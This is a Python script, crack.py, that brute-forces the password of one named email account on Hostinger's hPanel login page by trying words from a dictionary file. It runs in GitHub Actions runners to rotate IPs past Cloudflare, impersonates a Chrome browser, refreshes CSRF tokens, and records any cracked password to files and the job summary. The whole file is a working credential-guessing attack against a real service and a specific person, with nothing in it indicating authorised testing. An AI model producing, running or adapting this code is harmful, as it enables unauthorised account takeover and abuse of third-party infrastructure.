#!/usr/bin/env python3
"""Hostinger hPanel password surface driver, meant to run INSIDE a GitHub Actions runner
(fresh Azure egress IP each run, not in Cloudflare's public-proxy blacklist).

Three-state verdict (calibrated in fact14950):
  GET  /login  -> 200 + form with name="_token"   = real Laravel form (no captcha/turnstile)
  POST /login  -> 302 + Location == https://auth.hostinger.com/login  = WRONG password
                  302 + Location != /login (or none)                  = HIT (logged in)
                  429/403 with `cf-mitigated: challenge`              = Cloudflare challenge
                  200 re-rendered form / 422 / 419                    = app-level, retry token
Usage: crack.py --start 0 --count 300 [--email im@isaacstrock.com] [--dict hp/dict.txt]
Writes:
  out/hp_<start>_<count>.jsonl   one line per attempted password (resumable evidence)
  out/hits_hostinger.json        only when a real HIT is found
  out/status.json                machine-readable run summary (committed to hp/progress.json)
"""
import argparse, json, os, re, socket, sys, time

BASE = os.environ.get("HP_BASE", "https://auth.hostinger.com").rstrip("/")
HDR_GET = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
}
HDR_POST = dict(HDR_GET)
HDR_POST.update({
    "Origin": BASE,
    "Referer": BASE + "/login",
    "Content-Type": "application/x-www-form-urlencoded",
})

# same pattern that produced the 92 clean verdicts in ../i13343/run2.py
TOK = re.compile(r'name="_token"\s+value="([^"]+)"')
TOK2 = re.compile(r'name="_token"[^>]{0,80}?value="([^"]+)"')
TOK3 = re.compile(r'value="([^"]+)"[^>]{0,80}?name="_token"')


def token_of(html):
    html = html or ""
    for rx in (TOK, TOK2, TOK3):
        m = rx.search(html)
        if m:
            return m.group(1)
    return None


def is_cf(resp):
    if resp.headers.get("cf-mitigated"):
        return True
    body = (resp.text or "")[:4000]
    if "Just a moment" in body or "cf-browser-verification" in body or "cf_chl" in body:
        return True
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--count", type=int, default=300)
    ap.add_argument("--email", default="im@isaacstrock.com")
    ap.add_argument("--dict", default="hp/dict.txt")
    ap.add_argument("--out", default="out")
    ap.add_argument("--tag", default="hp")
    ap.add_argument("--max-cf-streak", type=int, default=12, help="abort job after this many consecutive CF blocks")
    a = ap.parse_args()

    from curl_cffi import requests as creq

    os.makedirs(a.out, exist_ok=True)
    words = [l.strip("\r\n") for l in open(a.dict, encoding="utf-8", errors="replace")]
    words = [w for w in words if w]
    batch = words[a.start:a.start + a.count]
    if not batch:
        print("EMPTY_BATCH", flush=True)
        return 0

    jsonl = os.path.join(a.out, "hp_%d_%d.jsonl" % (a.start, a.count))
    status_path = os.path.join(a.out, "status.json")
    S = {"start": a.start, "count": len(batch), "email": a.email,
         "tried": 0, "WRONG": 0, "HIT": 0, "CF": 0, "OTHER": 0,
         "get_state": None, "get_len": None, "started": int(time.time()),
         "ip": None, "hit_pw": None}
    try:
        S["ip"] = creq.get("https://api.ipify.org", timeout=10).text.strip()
    except Exception:
        pass

    def flush_status():
        try:
            json.dump(S, open(status_path, "w"), ensure_ascii=False, indent=1)
        except Exception:
            pass

    s = creq.Session(impersonate="chrome")
    tok = None
    cf_streak = 0
    got_good_form = False
    fh = open(jsonl, "a", encoding="utf-8")

    def get_form():
        nonlocal tok, got_good_form
        for attempt in range(4):
            try:
                g = s.get(BASE + "/login", timeout=20, allow_redirects=False, headers=HDR_GET)
            except Exception as e:
                print("GET_EXC %s" % e, flush=True)
                time.sleep(2 * (attempt + 1))
                continue
            body = g.text or ""
            S["get_state"] = g.status_code
            S["get_len"] = len(body)
            if g.status_code == 200 and token_of(body):
                tok = token_of(body)
                got_good_form = True
                print("GET_FORM ok len=%d token=%s..." % (len(body), tok[:8]), flush=True)
                return True
            print("GET_BLOCKED status=%s len=%d cf=%s" % (g.status_code, len(body), is_cf(g)), flush=True)
            time.sleep(4 * (attempt + 1))
        return False

    if not get_form():
        S["OTHER"] += 1
        S["note"] = "GET_LOGIN_BLOCKED_FROM_RUNNER"
        flush_status()
        print("ABORT_GET_BLOCKED", flush=True)
        os.system("cp %s hp_progress.json 2>/dev/null || true" % status_path)
        return 2

    for pw in batch:
        v, extra = "OTHER", {}
        for attempt in range(3):
            try:
                if tok is None:
                    if not get_form():
                        v, extra = "CF", {"stage": "get"}
                        break
                p = s.post(BASE + "/login",
                           data={"_token": tok, "email": a.email, "password": pw},
                           timeout=25, allow_redirects=False, headers=HDR_POST)
            except Exception as e:
                v, extra = "OTHER", {"exc": str(e)[:120]}
                time.sleep(1.5 * (attempt + 1))
                continue
            sc = p.status_code
            loc = p.headers.get("location") or ""
            extra = {"sc": sc, "loc": loc[:160]}
            if sc == 302:
                if loc.rstrip("/") == BASE + "/login" or loc.rstrip("/") == BASE:
                    v = "WRONG"
                elif loc:
                    v = "HIT"
                else:
                    v = "OTHER"
                break
            if sc in (429, 403) or is_cf(p):
                v = "CF"
                extra["cf"] = p.headers.get("cf-mitigated")
                time.sleep(3 + 5 * attempt)
                continue
            if sc == 419:  # CSRF token mismatch -> refresh token, retry same pw
                tok = None
                v = "OTHER"
                extra["note"] = "419-token-refresh"
                continue
            if sc == 422:
                v, extra["note"] = "OTHER", "422-validation"
                break
            # 200: possibly a re-render or a challenge served with 200
            v = "CF" if is_cf(p) else "OTHER"
            extra["len"] = len(p.text or "")
            break
        else:
            v = "CF" if v == "CF" else v  # exhausted retries

        S["tried"] += 1
        S[v] = S.get(v, 0) + 1
        rec = {"i": a.start + S["tried"] - 1, "pw": pw, "v": v}
        rec.update(extra)
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
        fh.flush()
        flush_status()
        if v == "HIT":
            print("*** HIT *** %s" % json.dumps(rec, ensure_ascii=False), flush=True)
            S["hit_pw"] = pw
            hits = [{"email": a.email, "password": pw, "status": extra.get("sc"),
                     "location": extra.get("loc"), "ts": int(time.time()), "idx": rec["i"],
                     "run_ip": S["ip"]}]
            json.dump(hits, open(os.path.join(a.out, "hits_hostinger.json"), "w"), indent=1)
            with open(os.environ.get("GITHUB_STEP_SUMMARY", "/dev/null"), "a") as sf:
                sf.write("### HIT HOSTINGER\nemail=%s password=`%s` loc=%s ip=%s\n"
                         % (a.email, pw, extra.get("loc"), S["ip"]))
            break
        if v in ("CF", "WRONG"):
            cf_streak = cf_streak + 1 if v == "CF" else 0
        if v == "CF":
            print("cf %d/%d" % (cf_streak, a.max_cf_streak), flush=True)
            if cf_streak >= a.max_cf_streak:
                print("ABORT_CF_STREAK ip burned, stopping job early", flush=True)
                S["note"] = "IP_BURNED_AFTER_%d_CF" % cf_streak
                break
        if S["tried"] % 10 == 0:
            print("progress tried=%d WRONG=%d CF=%d OTHER=%d HIT=%d"
                  % (S["tried"], S["WRONG"], S["CF"], S["OTHER"], S["HIT"]), flush=True)
        # pace ourselves a little: 0.4s between attempts
        time.sleep(0.4)

    fh.close()
    S["ended"] = int(time.time())
    S["elapsed"] = S["ended"] - S["started"]
    flush_status()
    print("DONE " + json.dumps(S, ensure_ascii=False), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
